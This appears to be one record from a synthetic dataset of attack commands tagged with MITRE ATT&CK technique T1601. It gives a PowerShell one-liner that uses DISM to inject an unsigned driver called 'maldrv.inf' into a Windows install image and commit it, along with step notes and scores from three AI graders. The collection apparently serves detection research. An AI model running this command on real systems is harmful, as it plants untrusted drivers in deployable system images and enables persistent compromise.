{
  "technique_id": "T1601",
  "platform": "Windows",
  "shell": "Powershell",
  "command": "$pre=(Get-FileHash 'C:\\images\\install.wim' -Algorithm SHA256).Hash; dism /Image:C:\\mount /Add-Driver /Driver:C:\\staging\\maldrv.inf /ForceUnsigned | Out-Null; dism /Unmount-Image /MountDir:C:\\mount /Commit | Out-Null; $post=(Get-FileHash 'C:\\images\\install.wim' -Algorithm SHA256).Hash; if($pre -ne $post){Write-Output 'WIM modified by driver injection'}; certutil -hashfile C:\\images\\install.wim SHA256",
  "explanation": "Adds an unsigned driver to the mounted image and commits the change, then verifies the WIM hash changed, demonstrating patching of the system image (T1601).",
  "rationale_steps": [
    "Record pre-modification WIM hash.",
    "Inject unsigned driver into the offline image with DISM.",
    "Commit changes by unmounting the image.",
    "Re-hash and compare to confirm image modification and log via certutil."
  ],
  "obfuscation_level": "none",
  "id": "SYN-POWERSHELL-T1601-dc7ef01c-629ed91b",
  "source_prompt_hash": "dc7ef01c",
  "timestamp_utc": "2025-09-30T04:49:19.161651Z",
  "validation": {
    "syntax_ok": null,
    "llm_judgments": [
      {
        "model": "claude-3-7-sonnet",
        "syntactic_score": 5,
        "syntactic_justification": "The command is perfectly well-formed with proper PowerShell syntax, balanced parentheses, appropriate semicolons as command separators, valid DISM parameters, and correct variable usage.",
        "semantic_score": 5,
        "semantic_justification": "The command perfectly aligns with T1601 by demonstrating system image modification through unsigned driver injection into a Windows image file (WIM), verifying the modification through hash comparison, and documenting the changes.",
        "combined_score": 5.0,
        "confidence": 0.95,
        "timestamp": "2025-10-02T17:05:25.057390Z"
      },
      {
        "model": "gemini-2.0-flash-thinking-exp",
        "syntactic_score": 5,
        "syntactic_justification": "The command is perfectly well-formed with correct Powershell syntax, balanced parentheses, proper command separators, and valid flags for all invoked executables and cmdlets.",
        "semantic_score": 2,
        "semantic_justification": "While the command sequence uses appropriate tools and syntax for modifying a WIM image, the stated privilege level of 'None' makes the critical `dism` operations to add a driver and commit changes impossible, preventing the command from achieving its claimed intent of patching the system image.",
        "combined_score": 3.5,
        "confidence": 1,
        "timestamp": "2025-10-02T17:05:44.311372Z"
      },
      {
        "model": "gpt-5",
        "syntactic_score": 5,
        "syntactic_justification": "The PowerShell one-liner is well-formed with balanced quotes/parentheses, valid DISM flags, and correct use of separators and piping.",
        "semantic_score": 4,
        "semantic_justification": "It appropriately uses DISM to inject an unsigned driver into a mounted WIM and commit changes (aligning with T1601), but it assumes a pre-mounted image and requires administrative privileges despite claiming none.",
        "combined_score": 4.5,
        "confidence": 0.87,
        "timestamp": "2025-10-02T17:05:56.431586Z"
      }
    ],
    "llm_average_syntactic": 5.0,
    "llm_average_semantic": 3.667,
    "llm_average_score": 4.333,
    "llm_verdict": "likely_match",
    "sandbox_trace_id": null,
    "mitre_match_score": null
  }
}